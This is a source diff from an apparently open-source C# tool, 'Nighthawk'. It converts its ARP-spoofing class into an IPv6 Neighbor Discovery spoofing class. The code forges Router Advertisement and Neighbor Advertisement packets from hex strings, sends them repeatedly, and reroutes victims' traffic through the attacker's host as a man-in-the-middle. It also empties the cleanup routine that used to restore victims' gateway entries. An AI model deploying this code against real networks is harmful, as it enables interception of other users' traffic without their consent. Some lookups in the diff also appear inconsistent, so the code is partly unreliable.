@@ -26,10 +26,9 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/
 namespace Nighthawk
 {
-    /* ARP spoofing, IPv4 routing */
-    public class ARPTools
+    /* ND spoofing, IPv6 routing */
+    public class NDTools
     {
-        // current device
         private WinPcapDevice device;
 
         public bool SpoofingStarted;
@@ -41,76 +40,61 @@ namespace Nighthawk
         public List<Packet> PacketQueueRouting = new List<Packet>();
         private List<Packet> threadQueueRouting = new List<Packet>();
 
-        public List<Target> SpoofingTargets1;
-        public Target SpoofingTarget2;
-
-        // simple IP - MAC table
-        public Dictionary<string, PhysicalAddress> IPtoMACTargets1;
-        
         private Thread workerSender;
         private Thread workerRouter;
+
+        // simple IPv6 - MAC table
+        public Dictionary<string, PhysicalAddress> IPv6toMACTargets;
 
         private DeviceInfo deviceInfo;
         private PhysicalAddress physicalAddress;
 
-        public ARPTools(DeviceInfo deviceInfo)
+        private string prefix;
+
+        public NDTools(DeviceInfo deviceInfo)
         {
             device = deviceInfo.Device;
             this.deviceInfo = deviceInfo;
         }
 
-        // start ARP spoofing (list of selected targets, gateway)
-        public void StartSpoofing(List<Target> targets1, Target target2)
+        // start ND spoofing (network prefix for RA packets, all detected targets)
+        public void StartSpoofing(string prefix, List<Target> targets)
         {
-            SpoofingTargets1 = targets1;
-            SpoofingTarget2 = target2;
+            this.prefix = prefix;
 
             physicalAddress = deviceInfo.PMAC;
-             
-            // parse targets to a simple IP - MAC table
-            IPtoMACTargets1 = new Dictionary<string, PhysicalAddress>();
-            SpoofingTargets1.ForEach(t => IPtoMACTargets1.Add(t.IP, t.PMAC));
-
-            // add a static ARP entry for our gateway
-            StaticARP(SpoofingTarget2.IP, SpoofingTarget2.PMAC, deviceInfo.WinName, StaticARPOperation.Add);
 
             SpoofingStarted = true;
+            
+            // parse targets to a simple IPv6 - MAC dictionary
+            IPv6toMACTargets = new Dictionary<string, PhysicalAddress>();
+            targets.ForEach(t => t.IPv6List.ForEach(i => IPv6toMACTargets.Add(i, t.PMAC)));
 
             PacketQueue.Clear();
 
-            // create ARP sender worker
+            // create ND sender worker
             workerSender = new Thread(new ThreadStart(WorkerSender));
-            workerSender.Name = "ARP sender thread";
+            workerSender.Name = "NDP sender thread";
             workerSender.Start();
 
-            // create IPv4 router worker
+            // create IPv6 router worker
             workerRouter = new Thread(new ThreadStart(WorkerRouter));
-            workerRouter.Name = "IPv4 router thread";
+            workerRouter.Name = "IPv6 router thread";
             workerRouter.Start();
         }
 
-        // stop ARP spoofing
+        // stop spoofing
         public void StopSpoofing()
         {
-            // remove a static ARP entry for our gateway
-            if (SpoofingStarted) StaticARP(SpoofingTarget2.IP, SpoofingTarget2.PMAC, deviceInfo.WinName, StaticARPOperation.Remove);
-
             SpoofingStarted = false;
 
-            // stop threads & re-ARP
+            // stop threads & send correct gateway
             if (workerSender != null && workerSender.IsAlive)
             {
-                ReArpTargets();
+                ReSendGateway();
                 workerSender.Join();
             }
 
-            if (workerRouter != null && workerRouter.IsAlive)
-            {
-                ReArpTargets();
-                workerRouter.Join();
-            }
-
-            // clear remaining queues
             threadQueue.Clear();
             threadQueueRouting.Clear();
             
@@ -118,12 +102,12 @@ namespace Nighthawk
             PacketQueueRouting.Clear();
         }
 
-        // static ARP entry manipulation (IP, MAC, friendly interface name, add/remove)
-        public bool StaticARP(string IP, PhysicalAddress mac, string WinName, StaticARPOperation operation)
+        // static ND entry manipulation (IP, MAC, friendly interface name, add/remove)
+        public bool StaticND(string IP, PhysicalAddress mac, string WinName, StaticNDOperation operation)
         {
             OperatingSystem system = Environment.OSVersion;
 
-            // format MAC address
+            // format MAC
             var macString = Network.FriendlyPhysicalAddress(mac).Replace(":", "-").ToLower();
 
             // prepare process
@@ -135,13 +119,14 @@ namespace Nighthawk
             p.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
             p.StartInfo.FileName = "cmd";
 
-            // Vista, Windows 7 - use "netsh"
+            // Vista, Windows 7 - "netsh"
             if (system.Version.Major > 5)
             {
-                if(operation == StaticARPOperation.Add)
-                    p.StartInfo.Arguments = "/k netsh interface ip add neighbors \"" + WinName + "\" " + IP + " " + macString + "";
+                // set parameters
+                if (operation == StaticNDOperation.Add)
+                    p.StartInfo.Arguments = "/k netsh interface ipv6 add neighbors \"" + WinName + "\" " + IP + " " + macString + "";
                 else
-                    p.StartInfo.Arguments = "/k netsh interface ip delete neighbors \"" + WinName + "\" " + IP + "";
+                    p.StartInfo.Arguments = "/k netsh interface ipv6 delete neighbors \"" + WinName + "\" " + IP + "";
 
                 p.Start();
                 p.WaitForExit();
@@ -152,68 +137,77 @@ namespace Nighthawk
             return false;
         }
 
-        // create ARP reply packet (sender IP, target IP, target's MAC)
-        private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC)
+        // create a fake RA packet (network prefix)
+        private EthernetPacket GenerateRouterAdvertisement(string prefix)
         {
-            return GenerateARPReply(senderIP, targetIP, targetMAC, physicalAddress);
+            var linkLocal = IPAddress.Parse(deviceInfo.LinkLocal);
+            var ipv6 = BitConverter.ToString(linkLocal.GetAddressBytes()).Replace("-", "");
+
+            // prepare RA packet
+            var bytes = Network.HexToByte("333300000001"
+                + deviceInfo.PMAC.ToString() +
+                "86dd6e00000000703aff"
+                + ipv6 +
+                "ff02000000000000000000000000000186002fe7ff080800000000000000040005010000000005dc030440c0111111110404040400000000"
+                + Network.IPv6ToFullHex(prefix) + 
+                "0101"
+                + deviceInfo.PMAC.ToString() + 
+                "1803000800001111000000000000000000000000000000001903000001010101ff0200000000000000000000000000fb");
+
+            return (EthernetPacket)Packet.Parse(bytes);
         }
 
-        // create ARP reply packet (sender IP, target IP, target MAC, specific source MAC)
-        private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC, PhysicalAddress sourceMAC)
+        // create a fake ND packet (source IP)
+        private EthernetPacket GenerateNDAdvertisement(string sourceIP)
         {
-            var ethernetPacket = new EthernetPacket(physicalAddress, targetMAC, EthernetPacketType.Arp);
-            var arpPacket = new ARPPacket(ARPOperation.Response, targetMAC, IPAddress.Parse(targetIP), sourceMAC, IPAddress.Parse(senderIP));
+            // prepare neighbor advertisement packet
+            var bytes = Network.HexToByte(
+                IPv6toMACTargets[sourceIP]
+                + deviceInfo.PMAC.ToString() +
+                "86dd6000000000203aff"
+                + Network.IPv6ToFullHex(sourceIP)
+                + Network.IPv6ToFullHex(prefix)
+                + "880067f760000000"
+                + Network.IPv6ToFullHex(sourceIP)
+                + "0201"
+                + deviceInfo.PMAC.ToString());
 
-            ethernetPacket.PayloadPacket = arpPacket;
-
-            return ethernetPacket;
+            return (EthernetPacket)Packet.Parse(bytes);
         }
 
-        // send old ARP information to targets
-        private void ReArpTargets()
+        // send correct RA back to targets and ND advertisements to the gateway
+        private void ReSendGateway()
         {
-            // somewhere around 58 bytes for an ARP reply
-            var sendQueue = new SendQueue(SpoofingTargets1.Count * 2 * 60);
-
-            foreach (Target target1 in SpoofingTargets1)
-            {
-                sendQueue.Add(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC, target1.PMAC).Bytes);
-                sendQueue.Add(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC, SpoofingTarget2.PMAC).Bytes);
-            }
-
-            device.SendQueue(sendQueue, SendQueueTransmitModes.Normal);
-            sendQueue.Dispose();
-
             return;
         }
 
-        // worker for sending ARP reply packets
+        // worker function for sending RA packets
         public void WorkerSender()
         {
-            var sendQueue = new SendQueue((SpoofingTargets1.Count * 2 * 60) + 60);
+            // 86 bytes for ND, 166 for RA ?
+            var sendQueue = new SendQueue(IPv6toMACTargets.Count * 86 + 166 + 512);
             
-            foreach (Target target1 in SpoofingTargets1)
+            sendQueue.Add(GenerateRouterAdvertisement(prefix).Bytes);
+            
+            foreach (var target in IPv6toMACTargets)
             {
-                // send fake replies to the gateway
-                sendQueue.Add(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC).Bytes);
-
-                // senda fake replies to targets
-                sendQueue.Add(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC).Bytes);
+                // send spoofed ND advertisements to the gateway
+                sendQueue.Add(GenerateNDAdvertisement(target.Key).Bytes);
             }
 
             while (SpoofingStarted)
             {
-                sendQueue.Transmit(device, SendQueueTransmitModes.Normal);
+                sendQueue.Transmit(device, SendQueueTransmitModes.Normal); 
 
                 Thread.Sleep(2500);
             }
 
             sendQueue.Dispose();
-
+            
             return;
         }
 
-        // worker for routing IPv4 packets
+        // worker function for routing IPv6 packets
         public void WorkerRouter()
         {
             while (SpoofingStarted)
@@ -221,7 +215,7 @@ namespace Nighthawk
                 // size of packets - needed for send queue (set some starting value - it seems the length is not set correctly during threadQueue packet copying)
                 int bufferSize = 2048;
 
-                // copy packets to thread's packet storage (threadRoutingQueue)
+                // copy packets to threadRoutingQueue
                 lock (PacketQueueRouting)
                 {
                     foreach (Packet packet in PacketQueueRouting)
@@ -247,31 +241,30 @@ namespace Nighthawk
 
                         var ip = (packet is IpPacket ? (IpPacket)packet : IpPacket.GetEncapsulated(packet));
 
-                        // discard invalid packets
-                        if (ip is IPv4Packet && ((IPv4Packet)ip).Checksum == 0) continue;
-
+                        // get IPs
                         var sourceIP = ip.SourceAddress.ToString();
                         var destinationIP = ip.DestinationAddress.ToString();
 
+                        // get MACs
                         var sourceMAC = ethernetPacket.SourceHwAddress.ToString();
                         var destinationMAC = ethernetPacket.DestinationHwAddress.ToString();
 
-                        if (destinationMAC == sourceMAC) continue;
-                        
+                        if (sourceIP == deviceInfo.IPv6 || destinationIP == deviceInfo.IPv6) continue;
+
                         // incoming packets - change destination MAC back to target's MAC
-                        if (IPtoMACTargets1.ContainsKey(destinationIP) && (destinationMAC != IPtoMACTargets1[destinationIP].ToString()))
+                        if (IPv6toMACTargets.ContainsKey(destinationIP) && (destinationMAC != IPv6toMACTargets[destinationIP].ToString()))
                         {
                             ethernetPacket.SourceHwAddress = physicalAddress;
-                            ethernetPacket.DestinationHwAddress = IPtoMACTargets1[destinationIP];
+                            ethernetPacket.DestinationHwAddress = IPv6toMACTargets[destinationIP];
 
                             if (ethernetPacket.Bytes != null) sendQueue.Add(packet.Bytes);
                         }
 
                         // outgoing packets - change destination MAC to gateway's MAC
-                        if (IPtoMACTargets1.ContainsKey(sourceIP) && (destinationMAC != SpoofingTarget2.PMAC.ToString()))
+                        if (IPv6toMACTargets.ContainsKey(sourceIP) && (destinationMAC != IPv6toMACTargets[prefix].ToString()))
                         {
                             ethernetPacket.SourceHwAddress = physicalAddress;
-                            ethernetPacket.DestinationHwAddress = SpoofingTarget2.PMAC;
+                            ethernetPacket.DestinationHwAddress = IPv6toMACTargets[prefix];
 
                             if (ethernetPacket.Bytes != null) sendQueue.Add(packet.Bytes);
                         }
@@ -292,7 +285,7 @@ namespace Nighthawk
         }
     }
 
-    public enum StaticARPOperation
+    public enum StaticNDOperation
     {
         Add,
         Remove
